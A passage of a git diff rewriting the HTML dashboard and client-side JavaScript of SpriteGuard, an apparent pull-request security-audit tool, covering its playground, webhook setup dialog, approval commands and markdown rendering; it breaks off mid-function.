-              <input type="text" id="custom-filename" placeholder="Filename (e.g., src/config.mjs)" value="src/config.mjs" />
-            </div>
-            <textarea class="code-input" id="custom-code" placeholder="Paste JavaScript/TypeScript/Python code, .env content, or a unified git diff to audit..."></textarea>
-            <div class="sandbox-row" style="margin-top:8px;justify-content:space-between">
-              <span class="muted" style="font-size:12px">Creates a synthetic PR via LocalGitHubSimulator and runs the full 3-layer audit + patch verifier.</span>
-              <button type="submit" class="primary" id="run-custom-btn">Run Zero-Trust Audit</button>
-            </div>
-          </form>
-        </div>
-      </section>
-
-      <section class="kpis">
-        <div class="card">
-          <div class="kpi-label">PRs Audited</div>
-          <div class="kpi-value" id="kpi-prs">0</div>
-          <div class="kpi-sub" id="kpi-pushed">0 patches pushed</div>
-        </div>
-        <div class="card">
-          <div class="kpi-label">Secrets &amp; Leaks Blocked</div>
-          <div class="kpi-value" id="kpi-secrets">0</div>
-          <div class="kpi-sub" id="kpi-awaiting">0 awaiting approval</div>
-        </div>
-        <div class="card">
-          <div class="kpi-label">Average Risk Score</div>
-          <div class="kpi-value" id="kpi-risk">0</div>
-          <div class="kpi-sub">0 (safe) – 100 (critical)</div>
-        </div>
-        <div class="card">
-          <div class="kpi-label">Active / Sleeping Sprites</div>
-          <div class="kpi-value" id="kpi-sprites">0 / 0</div>
-          <div class="kpi-sub" id="kpi-backend">Store: —</div>
-        </div>
-      </section>
-
-      <section class="status-bar" aria-label="System Reliability &amp; Zero-Trust Status">
-        <div class="status-pill" id="st-scanners-pill">
-          <span class="dot" id="st-scanners-dot"></span>
-          <span>Deterministic Scanners: <strong id="st-scanners-val">Online</strong></span>
-        </div>
-        <div class="status-pill" id="st-ai-pill">
-          <span class="dot" id="st-ai-dot"></span>
-          <span>AI Engine &amp; Auto-Fallback: <strong id="st-ai-val">Ready</strong></span>
-        </div>
-        <div class="status-pill" id="st-db-pill">
-          <span class="dot" id="st-db-dot"></span>
-          <span>Neon pgvector Store: <strong id="st-db-val">Connected</strong></span>
-        </div>
-        <div class="status-pill" id="st-gh-pill">
-          <span class="dot" id="st-gh-dot"></span>
-          <span>Split GitHub Connectors: <strong id="st-gh-val">Enforced</strong></span>
-        </div>
-      </section>
-
-      <section class="table-card">
-        <div class="table-head">
-          <h2>Live Audit Feed</h2>
-          <span class="muted mono" id="last-updated">—</span>
-        </div>
-        <table>
-          <thead>
-            <tr>
-              <th>Repository</th>
-              <th>PR</th>
-              <th>Risk Score</th>
-              <th>Findings</th>
-              <th>Egress Flagged</th>
-              <th>Patch Status</th>
-              <th>Sprite</th>
-              <th>Actions</th>
-            </tr>
-          </thead>
-          <tbody id="feed-body">
-            <tr><td colspan="8" class="empty">Loading audit telemetry…</td></tr>
-          </tbody>
-        </table>
-      </section>
     </div>
 
-    <div class="modal-backdrop" id="connect-modal" role="dialog" aria-modal="true" aria-labelledby="connect-modal-title">
-      <div class="modal">
-        <div class="modal-head">
-          <h2 id="connect-modal-title">Connect a GitHub Repository</h2>
-          <button type="button" id="close-connect-btn">Close</button>
+    <main class="wrap">
+      <!-- Dismissible Getting Started Card -->
+      <section class="gs card" id="gs" aria-label="Get started">
+        <div class="gh">
+          <b>Get started with SpriteGuard</b>
+          <button class="btn" id="gsx">Hide</button>
         </div>
-        <div class="modal-body">
-          <div class="modal-section">
-            <h3>1. Webhook Endpoint (Settings → Webhooks → Add webhook)</h3>
-            <div class="copy-row">
-              <div class="copy-code" id="webhook-url-display"></div>
-              <button type="button" id="copy-webhook-url">Copy</button>
-            </div>
-            <div class="muted" style="font-size:12px">
-              Set Content type to <span class="mono">application/json</span> and Secret to your <span class="mono">GITHUB_WEBHOOK_SECRET</span> (verified via <span class="mono">X-Hub-Signature-256</span>).
-            </div>
-          </div>
+        <ol id="gso"></ol>
+      </section>
 
-          <div class="modal-section">
-            <h3>2. Webhook Events &amp; Zero-Trust Split Connector Permissions</h3>
-            <ul class="checklist">
-              <li>✅ <strong>Webhook Events:</strong> Subscribe to <strong>Pull requests</strong> (<span class="mono">opened, synchronize, reopened, closed</span>) and <strong>Issue comments</strong> (<span class="mono">created</span>).</li>
-              <li>🔒 <strong>Read-Only Connector:</strong> <span class="mono">contents:read</span>, <span class="mono">pull_requests:read</span>, <span class="mono">metadata:read</span> — clones &amp; audits PRs; raw GitHub tokens never enter Sprites.</li>
-              <li>🚀 <strong>Write Connector (Trusted Publisher):</strong> <span class="mono">contents:write</span>, <span class="mono">pull_requests:write</span>, <span class="mono">issues:write</span> — commits verified patches strictly after maintainer approval.</li>
-            </ul>
+      <!-- Demo Playground + Public GitHub PR Scanner -->
+      <section class="demo card" id="playground-card" aria-label="Playground and PR scanner">
+        <div class="demo-head">
+          <div>
+            <b>Playground &amp; On-Demand PR Scanner</b>
+            <p id="scnd">Run an isolated Sprite audit against demo fixtures, custom code, or any public GitHub PR.</p>
           </div>
+          <div class="seg" id="pg-tabs" role="tablist" aria-label="Playground mode">
+            <button type="button" role="tab" aria-pressed="true" data-pg-tab="fixtures">Demo Fixtures</button>
+            <button type="button" role="tab" aria-pressed="false" data-pg-tab="custom">Audit Custom Code / Diff</button>
+          </div>
+        </div>
 
-          <div class="modal-section">
-            <h3>3. Interactive Pull Request Commands</h3>
-            <div class="copy-row">
-              <div class="copy-code">/spriteguard approve</div>
-              <button type="button" data-copy-cmd="/spriteguard approve">Copy</button>
+        <div class="demo-pane" id="pg-fixtures">
+          <div>
+            <p style="font-size:12.5px;color:var(--mu)" id="fixture-desc">
+              Selected: Vulnerable PR. Simulated credential exposure, egress and a patch to approve. Demo runs never touch connected repositories.
+            </p>
+          </div>
+          <label class="sel">
+            <span>Scenario</span>
+            <select id="scn">
+              <option value="vulnerable">Vulnerable PR: simulated credential exposure</option>
+              <option value="clean">Clean PR: no expected findings</option>
+            </select>
+          </label>
+          <button class="btn pri" id="demo-btn">Run demo audit</button>
+        </div>
+
+        <form class="custom-pane" id="custom-form" hidden>
+          <div class="preset-row">
+            <span>Attack presets:</span>
+            <button type="button" class="preset-chip" data-preset="leaked-keys">Leaked Cloud Keys</button>
+            <button type="button" class="preset-chip" data-preset="malicious-egress">Malicious Install Egress</button>
+            <button type="button" class="preset-chip" data-preset="cmd-injection">Command Injection</button>
+          </div>
+          <div class="custom-fields">
+            <input class="inp" id="custom-title" type="text" placeholder="PR title" value="feat(cloud): add storage client config" />
+            <input class="inp mono" id="custom-file" type="text" placeholder="src/config.mjs" value="src/config.mjs" />
+          </div>
+          <textarea class="code-ta" id="custom-code" placeholder="Paste code, .env content, or a unified git diff to audit inside an isolated Sprite..."></textarea>
+          <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
+            <span style="font-size:12px;color:var(--mu)">Executes the full 3-layer audit + patch verifier on a synthetic PR via LocalGitHubSimulator.</span>
+            <button type="submit" class="btn pri" id="custom-btn">Run zero-trust audit</button>
+          </div>
+        </form>
+
+        <form class="url-strip" id="url-form">
+          <label for="gh-url">Public GitHub PR:</label>
+          <input
+            class="inp mono"
+            id="gh-url"
+            type="text"
+            placeholder="https://github.com/owner/repo/pull/123 or owner/repo"
+            aria-label="Public GitHub PR URL or repository"
+          />
+          <button type="submit" class="btn pri" id="url-btn">Scan PR</button>
+        </form>
+      </section>
+
+      <!-- 4-Card KPI Summary Strip -->
+      <section class="stats" id="stats" aria-label="Summary"></section>
+
+      <!-- Master-Detail Workspace -->
+      <div class="grid">
+        <section class="card" aria-label="Audits">
+          <div class="tb">
+            <div class="tb-row">
+              <div class="seg" id="src-seg" aria-label="Source filter"></div>
+              <div class="seg" id="seg" aria-label="Status filter"></div>
             </div>
-            <div class="copy-row">
-              <div class="copy-code">/spriteguard rescan</div>
-              <button type="button" data-copy-cmd="/spriteguard rescan">Copy</button>
-            </div>
-            <div class="copy-row">
-              <div class="copy-code">@spriteguard Why was this finding flagged and is it exploitable?</div>
-              <button type="button" data-copy-cmd="@spriteguard Why was this finding flagged and is it exploitable?">Copy</button>
+            <div class="tb-row">
+              <input class="q" id="q" type="search" placeholder="Search repo, PR or commit" aria-label="Search audits" />
             </div>
           </div>
+          <div id="rows" role="listbox" aria-label="Audit list"></div>
+        </section>
+        <aside class="card dt" id="detail" aria-live="polite"></aside>
+      </div>
+    </main>
+
+    <footer class="wrap foot">
+      <button class="btn" id="hbtn" title="Component health and diagnostics">
+        <i class="dot mu"></i><span>System health: checking…</span>
+      </button>
+      <span class="grow"></span>
+      <span><kbd>j</kbd><kbd>k</kbd> move <kbd>a</kbd> approve <kbd>/</kbd> ask <kbd>⌘K</kbd> menu</span>
+    </footer>
+
+    <!-- Approve Confirmation Dialog -->
+    <dialog id="dlg">
+      <form method="dialog" class="dg">
+        <h3 id="dlg-title">Approve and push this patch?</h3>
+        <p id="dmsg"></p>
+        <div id="dlg-cmd-box" class="cp" hidden>
+          <code id="dlg-cmd">/spriteguard approve</code>
+          <button type="button" class="btn" data-copy="/spriteguard approve">Copy</button>
+        </div>
+        <div class="dgb">
+          <button class="btn" value="x">Cancel</button>
+          <button class="btn pri" id="dlg-ok" value="ok">Approve and push</button>
+        </div>
+      </form>
+    </dialog>
+
+    <!-- Connect GitHub Repo Dialog -->
+    <dialog id="cn">
+      <div class="dg">
+        <h3>Connect a GitHub repository</h3>
+        <p>Three steps. Nothing is written until a maintainer approves a verified patch.</p>
+        <h4>1. Add the webhook</h4>
+        <p>
+          In your repo, open Settings → Webhooks → Add webhook. Set Content type to
+          <code class="mono">application/json</code> and Secret to <code class="mono">GITHUB_WEBHOOK_SECRET</code>.
+          Subscribe to <b>Pull requests</b> and <b>Issue comments</b>.
+        </p>
+        <div class="cp">
+          <code id="wh-url"></code>
+          <button type="button" class="btn" id="wh-copy">Copy</button>
+        </div>
+        <h4>2. Grant two separate connectors</h4>
+        <p>
+          <b style="color:var(--tx);font-weight:500">Read connector</b> has <code class="mono">contents:read</code>,
+          <code class="mono">pull_requests:read</code>, and <code class="mono">metadata:read</code>. It clones and
+          audits inside isolated Sprites; raw tokens never enter Sprites.
+        </p>
+        <p style="margin-top:6px">
+          <b style="color:var(--tx);font-weight:500">Write connector</b> has <code class="mono">contents:write</code>,
+          <code class="mono">pull_requests:write</code>, and <code class="mono">issues:write</code>. It only commits
+          after <code class="mono">/spriteguard approve</code>.
+        </p>
+        <h4>3. Use these in a PR comment</h4>
+        <div class="cp"><code>/spriteguard approve</code><button type="button" class="btn" data-copy="/spriteguard approve">Copy</button></div>
+        <div class="cp"><code>/spriteguard rescan</code><button type="button" class="btn" data-copy="/spriteguard rescan">Copy</button></div>
+        <div class="cp">
+          <code>@spriteguard Why was this flagged?</code>
+          <button type="button" class="btn" data-copy="@spriteguard Why was this flagged?">Copy</button>
+        </div>
+        <div class="dgb"><button type="button" class="btn pri" data-close>Done</button></div>
+      </div>
+    </dialog>
+
+    <!-- Fix Prompt Dialog -->
+    <dialog id="fpd">
+      <div class="dg">
+        <h3 id="fpd-title">Fix prompt</h3>
+        <p>Review before copying. Nothing is sent anywhere; paste into Claude Code, Codex, or Cursor.</p>
+        <textarea id="fpt" readonly aria-label="Fix prompt"></textarea>
+        <div class="dgb">
+          <button type="button" class="btn" data-close>Close</button>
+          <button type="button" class="btn pri" id="fpc">Copy prompt</button>
         </div>
       </div>
-    </div>
+    </dialog>
 
-    <div class="toast" id="toast"></div>
+    <!-- Command Palette (Cmd+K) -->
+    <dialog id="pal">
+      <div class="dg pal">
+        <div class="ph">
+          <input
+            id="pq"
+            type="search"
+            enterkeyhint="go"
+            placeholder="Search repos, PRs, commits or actions"
+            aria-label="Command menu"
+            autocomplete="off"
+          />
+          <button type="button" class="btn" data-close>Close</button>
+        </div>
+        <ul id="pk" role="listbox"></ul>
+      </div>
+    </dialog>
+
+    <!-- System Health Dialog -->
+    <dialog id="hd">
+      <div class="dg">
+        <h3>System health</h3>
+        <p id="hm"></p>
+        <ul id="hl" class="hl"></ul>
+        <div class="dgb">
+          <button type="button" class="btn" data-close>Close</button>
+          <button type="button" class="btn pri" id="hchk">Check now</button>
+        </div>
+      </div>
+    </dialog>
+
+    <div id="t" role="status"></div>
 
     <script>
-      const state = {
-        auto: true,
-        timer: null,
-        expandedId: null,
-        activeTab: 'evidence',
-        qaReplies: {},
-        qaLoading: {},
-        qaDrafts: {},
-        approving: {},
-        mode: 'production',
-        scans: [],
-        lastData: null,
-      };
-
-      function esc(val) {
-        return String(val ?? '')
+      const $ = (s) => document.querySelector(s);
+      const esc = (s) =>
+        String(s ?? '')
           .replace(/&/g, '&amp;')
           .replace(/</g, '&lt;')
           .replace(/>/g, '&gt;')
           .replace(/"/g, '&quot;')
           .replace(/'/g, '&#39;');
-      }
-
-      function toast(msg, variant) {
-        const el = document.getElementById('toast');
-        el.textContent = msg;
-        el.className = 'toast' + (variant ? ' ' + variant : '');
-        el.style.display = 'block';
-        clearTimeout(el._t);
-        el._t = setTimeout(() => { el.style.display = 'none'; }, 4000);
-      }
-
-      function renderInlineMd(raw) {
-        let s = esc(raw).replace(/&amp;nbsp;/g, '&nbsp;');
-        // Inline code spans first, protecting their contents from bold/link parsing
-        const codes = [];
-        s = s.replace(/`([^`]+)`/g, (_, code) => {
-          const idx = codes.length;
-          let html = '<code>' + code + '</code>';
-          if (/🔴\s*CRITICAL/i.test(code)) html = '<span class="badge sev-Critical">' + code + '</span>';
-          else if (/🟠\s*HIGH/i.test(code)) html = '<span class="badge sev-High">' + code + '</span>';
-          else if (/🟡\s*MEDIUM/i.test(code)) html = '<span class="badge sev-Medium">' + code + '</span>';
-          else if (/🟢\s*LOW/i.test(code)) html = '<span class="badge sev-Low">' + code + '</span>';
-          codes.push(html);
-          return '\x00CODE' + idx + '\x00';
-        });
-        // Safe http(s) markdown links
-        s = s.replace(/\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>');
-        // Bold & italic
-        s = s.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
-        s = s.replace(/(^|[\s(])_([^_]+)_([\s).,!?:]|$)/g, '$1<em>$2</em>$3');
-        // Restore code/badge placeholders
-        s = s.replace(/\x00CODE(\d+)\x00/g, (_, i) => codes[Number(i)] || '');
-        return s;
-      }
-
-      function renderDiffCode(codeText) {
-        return codeText.split('\n').map((line) => {
-          const safe = esc(line);
-          if (line.startsWith('+') && !line.startsWith('+++')) return '<span class="diff-add">' + safe + '</span>';
-          if (line.startsWith('-') && !line.startsWith('---')) return '<span class="diff-del">' + safe + '</span>';
-          if (line.startsWith('@@')) return '<span class="diff-hunk">' + safe + '</span>';
-          return safe;
-        }).join('\n');
-      }
-
-      function renderMarkdownBlocks(md) {
-        if (!md) return '<p class="muted">No content available.</p>';
-        const clean = String(md).replace(/<!--[\s\S]*?-->/g, '').replace(/\r\n/g, '\n');
-        const lines = clean.split('\n');
-        const out = [];
-        let i = 0;
-
-        while (i < lines.length) {
-          const line = lines[i];
-          const trimmed = line.trim();
-
-          if (!trimmed) { i++; continue; }
-
-          // Collapsible <details> block from reportFormatter
-          if (trimmed === '<details>') {
-            let summaryText = 'Details';
-            const inner = [];
-            i++;
-            while (i < lines.length && lines[i].trim() !== '</details>') {
-              const sm = /^<summary>([\s\S]*?)<\/summary>$/i.exec(lines[i].trim());
-              if (sm) summaryText = sm[1].replace(/<\/?strong>/gi, '');
-              else inner.push(lines[i]);
-              i++;
-            }
-            if (i < lines.length) i++;
-            out.push(
-              '<details class="gh-details"><summary>' + esc(summaryText) + '</summary>' +
-              renderMarkdownBlocks(inner.join('\n')) +
-              '</details>'
-            );
-            continue;
-          }
-
-          // Fenced code block
-          const fence = /^```(\w*)/.exec(trimmed);
-          if (fence) {
-            const lang = (fence[1] || '').toLowerCase();
-            const codeLines = [];
-            i++;
-            while (i < lines.length && !lines[i].trim().startsWith('```')) {
-              codeLines.push(lines[i]);
-              i++;
-            }
-            if (i < lines.length) i++;
-            const rawCode = codeLines.join('\n');
-            out.push('<pre>' + (lang === 'diff' ? renderDiffCode(rawCode) : esc(rawCode)) + '</pre>');
-            continue;
-          }
-
-          // Headings
-          const hm = /^(#{2,4})\s+(.+)$/.exec(trimmed);
-          if (hm) {
-            const level = hm[1].length;
-            out.push('<h' + level + '>' + renderInlineMd(hm[2]) + '</h' + level + '>');
-            i++;
-            continue;
-          }
-
-          // Blockquotes & GitHub Callouts (> [!CAUTION], etc.)
-          if (trimmed.startsWith('>')) {
-            const qLines = [];
-            while (i < lines.length && lines[i].trim().startsWith('>')) {
-              qLines.push(lines[i].trim().replace(/^>\s?/, ''));
-              i++;
-            }
-            const callout = /^\[!(CAUTION|WARNING|IMPORTANT|NOTE|TIP)\]\s*$/i.exec(qLines[0] || '');
-            if (callout) {
-              const kind = callout[1].toLowerCase();
-              out.push(
-                '<div class="gh-callout ' + esc(kind) + '">' +
-                  '<div class="gh-callout-title">' + esc(callout[1].toUpperCase()) + '</div>' +
-                  renderMarkdownBlocks(qLines.slice(1).join('\n')) +
-                '</div>'
-              );
-            } else {
-              out.push('<blockquote>' + qLines.map((l) => renderInlineMd(l)).join('<br>') + '</blockquote>');
-            }
-            continue;
-          }
-
-          // Markdown Table
-          if (trimmed.startsWith('|') && i + 1 < lines.length && /^\|[\s:-]+\|/.test(lines[i + 1].trim())) {
-            const parseCells = (row) => row.trim().replace(/^\||\|$/g, '').split('|').map((c) => c.trim());
-            const headers = parseCells(lines[i]);
-            i += 2;
-            const bodyRows = [];
-            while (i < lines.length && lines[i].trim().startsWith('|')) {
-              bodyRows.push(parseCells(lines[i]));
-              i++;
-            }
-            out.push(
-              '<table class="gh-table"><thead><tr>' +
-              headers.map((h) => '<th>' + renderInlineMd(h) + '</th>').join('') +
-              '</tr></thead><tbody>' +
-              bodyRows.map((r) => '<tr>' + r.map((c) => '<td>' + renderInlineMd(c) + '</td>').join('') + '</tr>').join('') +
-              '</tbody></table>'
-            );
-            continue;
-          }
-
-          // Bullet / task list
-          if (/^\s*[-*]\s+/.test(line)) {
-            const items = [];
-            while (i < lines.length && /^\s*[-*]\s+/.test(lines[i])) {
-              let itemText = lines[i].replace(/^\s*[-*]\s+/, '');
-              if (/^\[ \]\s+/.test(itemText)) itemText = '☐ ' + itemText.slice(4);
-              else if (/^\[x\]\s+/i.test(itemText)) itemText = '☑ ' + itemText.slice(4);
-              items.push('<li>' + renderInlineMd(itemText) + '</li>');
-              i++;
-            }
-            out.push('<ul>' + items.join('') + '</ul>');
-            continue;
-          }
-
-          // Paragraph
-          const para = [];
-          while (
-            i < lines.length &&
-            lines[i].trim() &&
-            !/^(#{2,4}\s|```|>|\||<details>|\s*[-*]\s+)/.test(lines[i].trim())
-          ) {
-            para.push(lines[i].trim());
-            i++;
-          }
-          if (para.length) out.push('<p>' + renderInlineMd(para.join(' ')) + '</p>');
-          else i++;
-        }
-        return out.join('');
-      }
-
-      async function copyMarkdownText(text, btn) {
+      const ls = (k, v) => {
         try {
-          if (navigator.clipboard && navigator.clipboard.writeText) {
-            await navigator.clipboard.writeText(text);
-          } else {
-            const ta = document.createElement('textarea');
-            ta.value = text;
-            document.body.appendChild(ta);
-            ta.select();
-            document.execCommand('copy');
-            ta.remove();
-          }
-          if (btn) {
-            const prev = btn.textContent;
-            btn.textContent = 'Copied!';
-            setTimeout(() => { btn.textContent = prev; }, 1600);
-          }
-          toast('Copied PR Markdown report to clipboard', 'success');
-        } catch (err) {
-          toast('Copy failed: ' + err.message, 'error');
+          if (v === undefined) return localStorage.getItem(k);
+          localStorage.setItem(k, v);
+        } catch {
+          return null;
         }
-      }
+      };
 
-      function authHeaders() {
-        const params = new URLSearchParams(location.search);
-        const token = params.get('token') || localStorage.getItem('sg_dashboard_token');
-        return token ? { Authorization: 'Bearer ' + token } : {};
-      }
+      const ST = {
+        awaiting_approval: ['Needs approval', 'md'],
+        needs_review: ['Needs review', 'hi'],
+        pushed: ['Patch pushed', 'ok'],
+        approved: ['Approved', 'ac'],
+        clean: ['Clean', 'ok'],
+        failed: ['Failed', 'cr'],
+        publish_failed: ['Push failed', 'cr'],
+        superseded: ['Superseded', 'mu'],
+        closed: ['Closed', 'mu'],
+        running: ['Scanning', 'ac'],
+        queued: ['Queued', 'ac'],
+      };
 
-      function patchStatusLabel(scan) {
-        if (scan.status === 'awaiting_approval') return 'Awaiting Approval';
-        if (scan.status === 'pushed') return 'Approved & Pushed';
-        if (scan.status === 'clean') return 'Clean';
-        if (scan.status === 'needs_review') return 'Needs Review';
-        if (scan.status === 'running') return 'Auditing…';
-        if (scan.status === 'queued') return 'Queued';
-        if (scan.status === 'failed' || scan.status === 'publish_failed') return 'Failed';
-        if (scan.status === 'superseded') return 'Superseded';
-        if (scan.status === 'closed') return 'Closed';
-        return scan.status;
-      }
-
-      function setStatusPill(prefix, text, level, title) {
-        const dot = document.getElementById(prefix + '-dot');
-        const val = document.getElementById(prefix + '-val');
-        const pill = document.getElementById(prefix + '-pill');
-        if (val) val.textContent = text;
-        if (dot) dot.className = 'dot' + (level === 'warn' ? ' warn' : level === 'err' ? ' err' : '');
-        if (pill && title) pill.title = title;
-      }
-
-      function renderHealth(health) {
-        if (!health) {
-          setStatusPill('st-scanners', 'Offline', 'err', 'Health endpoint unreachable');
-          setStatusPill('st-ai', 'Offline', 'err', 'Health endpoint unreachable');
-          setStatusPill('st-db', 'Disconnected', 'err', 'Health endpoint unreachable');
-          setStatusPill('st-gh', 'Unavailable', 'err', 'Health endpoint unreachable');
-          return;
-        }
-        const ok = health.status === 'ok';
-        setStatusPill(
-          'st-scanners',
-          'Online',
-          'ok',
-          'Layer A Secret Scanner & Layer B Egress Probe active (' + (health.spriteDriver || 'sandbox') + ')',
-        );
-        const aiDetail = health.aiEnabled
-          ? 'Provider: ' + (health.provider || 'llm') + ' · Model: ' + (health.model || 'default') + ' (auto-fallback armed)'
-          : 'Deterministic heuristic auto-fallback active (' + (health.provider || 'heuristic') + ')';
-        setStatusPill('st-ai', 'Ready', 'ok', aiDetail);
-
-        if (health.dbHealthy) {
-          const dbDetail = health.store === 'postgres'
-            ? 'Neon Postgres + pgvector connected'
-            : 'In-memory vector store connected (LOCAL_SANDBOX_MODE)';
-          setStatusPill('st-db', 'Connected', 'ok', dbDetail);
-        } else {
-          setStatusPill('st-db', 'Degraded', 'err', 'Database health check failed');
-        }
-
-        const ghDetail = 'Split Read-Only & Write connectors enforced (mode: ' + (health.githubMode || 'split') + ')';
-        setStatusPill('st-gh', 'Enforced', ok ? 'ok' : 'warn', ghDetail);
-      }
-
-      async function fetchScans() {
-        try {
-          const [scansOutcome, healthOutcome] = await Promise.allSettled([
-            fetch('/api/scans', { headers: authHeaders() }),
-            fetch('/health'),
-          ]);
-
-          if (healthOutcome.status === 'fulfilled') {
-            try {
-              const healthData = await healthOutcome.value.json();
-              renderHealth(healthData);
-            } catch {
-              renderHealth(null);
-            }
-          } else {
-            renderHealth(null);
-          }
-
-          if (scansOutcome.status !== 'fulfilled') throw scansOutcome.reason;
-          const res = scansOutcome.value;
-          if (res.status === 401) {
-            const entered = prompt('Enter SpriteGuard DASHBOARD_TOKEN:');
-            if (entered) {
-              localStorage.setItem('sg_dashboard_token', entered.trim());
-              return fetchScans();
-            }
-            return;
-          }
-          const data = await res.json();
-          state.mode = data.mode;
-          state.scans = data.scans || [];
-          state.lastData = data;
-          render(data);
-        } catch (err) {
-          document.getElementById('mode-text').textContent = 'Disconnected';
-          document.getElementById('mode-dot').classList.add('warn');
-        }
-      }
-
-      function render(data) {
-        if (!data) return;
-        const activeEl = document.activeElement;
-        const activeAskScanId = activeEl && activeEl.matches('input[data-ask-input]')
-          ? activeEl.getAttribute('data-ask-input')
-          : null;
-        const activeSelStart = activeAskScanId ? activeEl.selectionStart : null;
-        const activeSelEnd = activeAskScanId ? activeEl.selectionEnd : null;
-
-        const isLocal = data.mode === 'local-sandbox';
-        const isPlayground = isLocal || Boolean(data.playgroundEnabled);
-        document.getElementById('mode-text').textContent = isLocal ? 'Local Sandbox Mode' : 'Production (Fly Sprites)';
-        document.getElementById('mode-dot').classList.toggle('warn', isLocal);
-        document.getElementById('demo-bar').classList.toggle('visible', isPlayground);
-
-        const s = data.stats || {};
-        document.getElementById('kpi-prs').textContent = String(s.prsAudited ?? 0);
-        document.getElementById('kpi-pushed').textContent = (s.patchesPushed ?? 0) + ' patches pushed';
-        document.getElementById('kpi-secrets').textContent = String(s.secretsBlocked ?? 0);
-        document.getElementById('kpi-awaiting').textContent = (s.awaitingApproval ?? 0) + ' awaiting approval';
-        document.getElementById('kpi-risk').textContent = String(s.averageRiskScore ?? 0);
-        document.getElementById('kpi-sprites').textContent = (s.activeSprites ?? 0) + ' / ' + (s.sleepingSprites ?? 0);
-        document.getElementById('kpi-backend').textContent = 'Store: ' + (data.storeBackend || '—') + ' · Model: ' + (data.model || '—');
-        document.getElementById('last-updated').textContent = 'Updated ' + new Date().toLocaleTimeString();
-
-        const tbody = document.getElementById('feed-body');
-        if (!state.scans.length) {
-          tbody.innerHTML = '<tr><td colspan="8" class="empty">No Pull Requests audited yet. ' +
-            (isLocal ? 'Click "Run Demo PR Audit" above to test the full pipeline.' : 'Waiting for GitHub webhook events on POST /webhook.') +
-            '</td></tr>';
-          return;
-        }
-
-        const rows = [];
-        for (const item of state.scans) {
-          const sev = item.severity || 'Low';
-          const score = item.riskScore === null || item.riskScore === undefined ? '—' : item.riskScore;
-          const isOpen = state.expandedId === item.id;
-          const flagged = (item.egressDomains || []).filter((d) => d.flagged);
-          const isApproving = Boolean(state.approving[item.id]);
-
-          rows.push(
-            '<tr class="scan-row" data-id="' + esc(item.id) + '">' +
-              '<td><div style="font-weight:600">' + esc(item.repoFullName) + '</div><div class="muted" style="font-size:12px">' + esc(item.prTitle) + '</div></td>' +
-              '<td class="mono">#' + esc(item.prNumber) + '<div class="muted">' + esc((item.headSha || '').slice(0, 7)) + '</div></td>' +
-              '<td><span class="badge sev-' + esc(sev) + '">' + esc(score) + ' · ' + esc(sev) + '</span></td>' +
-              '<td><strong>' + esc(item.findingsCount) + '</strong> <span class="muted">(' + esc(item.secretsCount) + ' secrets)</span></td>' +
-              '<td>' + (flagged.length ? '<span class="badge sev-High">' + flagged.length + ' flagged</span>' : '<span class="muted">0</span>') + '</td>' +
-              '<td><span class="badge status-' + esc(item.status) + '">' + esc(patchStatusLabel(item)) + '</span></td>' +
-              '<td class="mono muted">' + esc(item.spriteState) + '</td>' +
-              '<td>' +
-                (isPlayground && item.status === 'awaiting_approval'
-                  ? '<button class="approve" data-approve="' + esc(item.id) + '"' + (isApproving ? ' disabled' : '') + '>' +
-                    (isApproving ? '<span class="spinner"></span>Waking Sprite &amp; Pushing...' : 'Approve Patch') +
-                    '</button> '
-                  : '') +
-                '<button data-toggle="' + esc(item.id) + '">' + (isOpen ? 'Hide' : 'Inspect') + '</button>' +
-              '</td>' +
-            '</tr>'
-          );
-
-          if (isOpen) {
-            rows.push(renderDetailRow(item, isPlayground));
-          }
-        }
-        tbody.innerHTML = rows.join('');
-
-        tbody.querySelectorAll('tr.scan-row').forEach((tr) => {
-          tr.addEventListener('click', (ev) => {
-            if (ev.target.closest('button')) return;
-            const id = tr.getAttribute('data-id');
-            state.expandedId = state.expandedId === id ? null : id;
-            render(state.lastData);
-          });
-        });
-        tbody.querySelectorAll('button[data-toggle]').forEach((btn) => {
-          btn.addEventListener('click', () => {
-            const id = btn.getAttribute('data-toggle');
-            state.expandedId = state.expandedId === id ? null : id;
-            render(state.lastData);
-          });
-        });
-        tbody.querySelectorAll('button[data-approve]').forEach((btn) => {
-          btn.addEventListener('click', () => approveDemoScan(btn.getAttribute('data-approve')));
-        });
-        tbody.querySelectorAll('button[data-tab]').forEach((btn) => {
-          btn.addEventListener('click', () => {
-            state.activeTab = btn.getAttribute('data-tab');
-            render(state.lastData);
-          });
-        });
-        tbody.querySelectorAll('button[data-copy-md]').forEach((btn) => {
-          btn.addEventListener('click', () => {
-            const scanId = btn.getAttribute('data-copy-md');
-            const scan = state.scans.find((x) => x.id === scanId);
-            if (scan && scan.reportMarkdown) copyMarkdownText(scan.reportMarkdown, btn);
-          });
-        });
-        tbody.querySelectorAll('input[data-ask-input]').forEach((input) => {
-          input.addEventListener('input', () => {
-            const scanId = input.getAttribute('data-ask-input');
-            state.qaDrafts[scanId] = input.value;
-          });
-        });
-        tbody.querySelectorAll('form[data-ask-form]').forEach((form) => {
-          form.addEventListener('submit', (ev) => {
-            ev.preventDefault();
-            const scanId = form.getAttribute('data-ask-form');
-            if (state.qaLoading[scanId]) return;
-            const input = form.querySelector('input');
-            if (input && input.value.trim()) askDemoQuestion(scanId, input.value.trim());
-          });
-        });
-
-        // Restore focus & caret if user was typing in the @spriteguard input during 5s refresh
-        if (activeAskScanId) {
-          const restored = tbody.querySelector('input[data-ask-input="' + activeAskScanId.replace(/"/g, '\\"') + '"]');
-          if (restored && !restored.disabled) {
-            restored.focus();
-            if (activeSelStart !== null && activeSelEnd !== null) {
-              try { restored.setSelectionRange(activeSelStart, activeSelEnd); } catch {}
-            }
-          }
-        }
-      }
-
-      function renderDetailRow(item, isLocal) {
-        const rep = item.report;
-        const patch = item.patch;
-        let body = '';
-
-        if (state.activeTab === 'markdown') {
-          const md = item.reportMarkdown || '';
-          body =
-            '<div class="gh-comment">' +
-              '<div class="gh-comment-head">' +
-                '<div class="gh-author">' +
-                  '<span class="gh-avatar">SG</span>' +
-                  '<strong>spriteguard</strong>' +
-                  '<span class="gh-bot-pill">bot</span>' +
-                  '<span class="muted">commented on PR #' + esc(item.prNumber) + ' · ' + esc((item.headSha || '').slice(0, 7)) + '</span>' +
-                '</div>' +
-                '<button type="button" data-copy-md="' + esc(item.id) + '"' + (md ? '' : ' disabled') + '>Copy Markdown</button>' +
-              '</div>' +
